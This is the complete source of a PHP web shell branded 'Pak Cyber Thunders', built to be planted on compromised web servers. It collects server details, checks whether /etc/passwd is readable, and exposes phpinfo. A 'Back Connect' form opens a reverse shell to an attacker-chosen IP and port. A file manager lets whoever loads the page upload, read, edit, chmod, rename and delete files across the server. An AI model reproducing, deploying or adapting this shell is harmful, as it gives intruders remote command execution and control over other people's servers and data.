<center>
<H1><center>Pak Cyber Thunders</center></H1>
<table width="700" border="1" cellpadding="3" cellspacing="1" align="center">
<tr><td>
<center>
<?php
$freespace_show = sprintf('%1.2f', $bytes / pow($base, $class)) . ' ' . $si_prefix[$class] . '';
$etc_passwd = @is_readable("/etc/passwd") ? "<b><span style=\"color:green\">ON </span></b>" : "<b><span style=\"color:red\"/> Disabled </span></b>";
echo '<b><font color=red>Disable Functions: </b></font>';
    if ('' == ($func = @ini_get('disable_functions'))) {
        echo "<b><font color=green>NONE</font></b>";
    } else {
        echo "<b><font color=red>$func</font></b>";
    echo '</td></tr>';
    }
echo '</br>';
echo '<b><font color=red>SysTeM INFO : </b></font><b>'.php_uname().'</b>';
echo '</br>';
echo '<b><font color=red>PHP VerSion : </b></font><b>'. phpversion() .'</b>';
echo '</br>';
echo '<b><font color=red>SeRver AdMin : </b></font><b>'.$_SERVER['SERVER_ADMIN'].'</b>';
echo '</br>';
echo '<b><font color=red>SerVer IP  :   </b></font><b>'.$_SERVER['SERVER_ADDR'].' </b>';
echo '<b><font color=red>YoUr IP :  </b></font><b>'.$_SERVER['REMOTE_ADDR'].'</b>';
echo "</br>";
echo "<b><font color=red>SaFe MoDe :  </font></b>";
// Check for safe mode
if( ini_get('safe_mode') ) {
  print '<font color=#FF0000><b>ON</b></font>';
} else {
  print '<font color=#008000><b>OFF</b></font>';
}
echo "</br>";
echo "<b><font color=red>Read etc/passwd : </font></b><b>$etc_passwd</b>";
echo "<b><font color=red>Functions : </font><b>";echo "<a href='$php_self?p=info'> PHP INFO </a>";
if(@$_GET['p']=="info"){@phpinfo();
exit;}
?>
<br>
</center>
<center>
<b><font color=red>Back Connect </font></b>
<form action="?connect=Pub" method="post">
  IP : <input type="text" name="ip" value= "Your IP"/>
  PORt :<input type="text" name="port" value= "80"/>
 <input alt="Submit" type="image">
</form>
<?php
function printit ($string)
 {
   if (!$daemon) 
{
      print "$string\
";
   }
}
$bc = $_GET["connect"];
switch($bc)
{
case "Pub":
set_time_limit (0);
$VERSION = "1.0";
$ip = $_POST["ip"];
$port = $_POST["port"];
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$daemon = 0;
$debug = 0;
if (function_exists('pcntl_fork')) 
{

   $pid = pcntl_fork();

   if ($pid == -1) 
{
      printit("ERROR: Can't fork");
      exit(1);
   }

   if ($pid) {
      exit(0);  // Parent exits
   }
   if (posix_setsid() == -1) {
      printit("Error: Can't setsid()");
      exit(1);
   }

   $daemon = 1;
} 
else {
   print("DISCONNECTED");
}

// Change to a safe directory
chdir("/tmp/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
   printit("$errstr ($errno)");
   exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
   printit("ERROR: Can't spawn shell");
   exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("");

while (1) {
   // Check for end of TCP connection
   if (feof($sock)) {
      printit(" :- TCP connection ended");
      break;
   }

   // Check for end of STDOUT
   if (feof($pipes[1])) {
      printit("END of STDOUT");
      break;
   }

   // Wait until a command is end down $sock, or some
   // command output is available on STDOUT or STDERR
   $read_a = array($sock, $pipes[1], $pipes[2]);
   $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

   // If we can read from the TCP socket, send
   // data to process's STDIN
   if (in_array($sock, $read_a)) {
      if ($debug) printit("SOCK READ");
      $input = fread($sock, $chunk_size);
      if ($debug) printit("SOCK: $input");
      fwrite($pipes[0], $input);
   }

   // If we can read from the process's STDOUT
   // send data down tcp connection
   if (in_array($pipes[1], $read_a)) {
      if ($debug) printit("STDOUT READ");
      $input = fread($pipes[1], $chunk_size);
      if ($debug) printit("STDOUT: $input");
      fwrite($sock, $input);
   }

   // If we can read from the process's STDERR
   // send data down tcp connection
   if (in_array($pipes[2], $read_a)) {
      if ($debug) printit("STDERR READ");
      $input = fread($pipes[2], $chunk_size);
      if ($debug) printit("STDERR: $input");
      fwrite($sock, $input);
   }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
break;
}


  ?>
</center>
</td></tr>';
<?php

set_time_limit(0);
error_reporting(0);

if(get_magic_quotes_gpc()){
    foreach($_POST as $key=>$value){
        $_POST[$key] = stripslashes($value);
    }
}
echo '<!DOCTYPE HTML>
<HTML>
<HEAD>
<link href="" rel="stylesheet" type="text/css">
<title>PAK CYBER THUNDERS</title>
<style>
body{
    font-family: "Kristen ITC", cursive;
background: black;
    text-shadow: 0px 0px 10px green;
    color: green;
    background-attachment: fixed;
    background-size: cover;
}
#content tr:hover{
    background-color: darkred;
    text-shadow:0px 0px 15px Green;
}
#content .first{
    background-color: black;
}
#content .first:hover{
    background-color: black;
    text-shadow:0px 0px 15px blue;
}
table{
    border: 1px red dotted;
}
H1{
    font-family: "Kristen ITC", cursive;
}
a{
    color: Green;
    text-decoration: none;
}
a:hover{
    color: red;
    text-shadow:0px 5px 15px blue;
}
input,select,textarea{
    border: 1px red solid;
    -moz-border-radius: 5px;
    -webkit-border-radius:5px;
    border-radius:5px;
}
</style>
</HEAD>
<BODY>

<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>
<center>
<font color=red><b>Current Path : </font></b>';
if(isset($_GET['path'])){
    $path = $_GET['path'];   
}else{
    $path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
    if($pat == '' && $id == 0){
        $a = true;
        echo '<a href="?path=/">/</a>';
        continue;
    }
    if($pat == '') continue;
    echo '<a href="?path=';
    for($i=0;$i<=$id;$i++){
        echo "$paths[$i]";
        if($i != $id) echo "/";
    }
    echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
    if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
        echo '<font color="green">File Upload Done :D </font><br />';
    }else{
        echo '<font color="red">File Upload Error :( </font><br />';
    }
}
echo '<center>';
echo '<form enctype="multipart/form-data" method="POST">
<b><font color=red>File Upload : </b></font><input type="file" name="file" />
<input type="submit" value="upload" />
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
    echo "<tr><td>Current File : ";
    echo $_GET['filesrc'];
    echo '</tr></td></table><br />';
    echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
    echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
    if($_POST['opt'] == 'chmod'){
        if(isset($_POST['perm'])){
            if(chmod($_POST['path'],$_POST['perm'])){
                echo '<font color="green">Change Permission Done :D </font><br />';
            }else{
                echo '<font color="red">Change Permission Error :( </font><br />';
            }
        }
        echo '<form method="POST">
        Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="chmod">
        <input type="submit" value="Go" />
        </form>';
    }elseif($_POST['opt'] == 'rename'){
        if(isset($_POST['newname'])){
            if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
                echo '<font color="green">Change Name Done :D </font><br />';
            }else{
                echo '<font color="red">Change Name Error :( </font><br />';
            }
            $_POST['name'] = $_POST['newname'];
        }
        echo '<form method="POST">
        New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="rename">
        <input type="submit" value="Go" />
        </form>';
    }elseif($_POST['opt'] == 'edit'){
        if(isset($_POST['src'])){
            $fp = fopen($_POST['path'],'w');
            if(fwrite($fp,$_POST['src'])){
                echo '<font color="green">Edit File Done :D </font><br />';
            }else{
                echo '<font color="red">Edit File Error :( </font><br />';
            }
            fclose($fp);
        }
        echo '<form method="POST">
        <textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
        <input type="hidden" name="path" value="'.$_POST['path'].'">
        <input type="hidden" name="opt" value="edit">
        <input type="submit" value="Go" />
        </form>';
    }
    echo '</center>';
}else{
    echo '</table><br /><center>';
    if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
        if($_POST['type'] == 'dir'){
            if(rmdir($_POST['path'])){
                echo '<font color="green">Delete Dir Done :D </font><br />';
            }else{
                echo '<font color="red">Delete Dir Error :( </font><br />';
            }
        }elseif($_POST['type'] == 'file'){
            if(unlink($_POST['path'])){
                echo '<font color="green">Delete File Done :D </font><br />';
            }else{
                echo '<font color="red">Delete File Error :( </font><br />';
            }
        }
    }
    echo '</center>';
    $scandir = scandir($path);
    echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
    <tr class="first">
        <td><center>Name</center></td>
        <td><center>Size</center></td>
        <td><center>Permissions</center></td>
        <td><center>Options</center></td>
    </tr>';

    foreach($scandir as $dir){
        if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
        echo "<tr>
        <td><a href=\"?path=$path/$dir\">$dir</a></td>
        <td><center>--</center></td>
        <td><center>";
        if(is_writable("$path/$dir")) echo '<font color="green">';
        elseif(!is_readable("$path/$dir")) echo '<font color="red">';
        echo perms("$path/$dir");
        if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
        
        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?option&path=$path\">
        <select name=\"opt\">
	    <option value=\"\"></option>
        <option value=\"delete\">Delete</option>
        <option value=\"chmod\">Chmod</option>
        <option value=\"rename\">Rename</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"dir\">
        <input type=\"hidden\" name=\"name\" value=\"$dir\">
        <input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
        <input type=\"submit\" value=\">\" />
        </form></center></td>
        </tr>";
    }
    echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
    foreach($scandir as $file){
        if(!is_file("$path/$file")) continue;
        $size = filesize("$path/$file")/1024;
        $size = round($size,3);
        if($size >= 1024){
            $size = round($size/1024,2).' MB';
        }else{
            $size = $size.' KB';
        }

        echo "<tr>
        <td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
        <td><center>".$size."</center></td>
        <td><center>";
        if(is_writable("$path/$file")) echo '<font color="green">';
        elseif(!is_readable("$path/$file")) echo '<font color="red">';
        echo perms("$path/$file");
        if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
        echo "</center></td>
        <td><center><form method=\"POST\" action=\"?option&path=$path\">
        <select name=\"opt\">
	    <option value=\"\"></option>
        <option value=\"delete\">Delete</option>
        <option value=\"chmod\">Chmod</option>
        <option value=\"rename\">Rename</option>
        <option value=\"edit\">Edit</option>
        </select>
        <input type=\"hidden\" name=\"type\" value=\"file\">
        <input type=\"hidden\" name=\"name\" value=\"$file\">
        <input type=\"hidden\" name=\"path\" value=\"$path/$file\">
        <input type=\"submit\" value=\">\" />
        </form></center></td>
        </tr>";
    }
    echo '</table>
    </div>';
}
echo '<br />PAK CYBER THUNDERS || <font color="red">Pakistan Zindabad</font>||<font color="black">
</font>
</BODY>
</HTML>';
function perms($file){
    $perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
    // Socket
    $info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
    // Symbolic Link
    $info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
    // Regular
    $info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
    // Block special
    $info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
    // Directory
    $info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
    // Character special
    $info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
    // FIFO pipe
    $info = 'p';
} else {
    // Unknown
    $info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}
?>
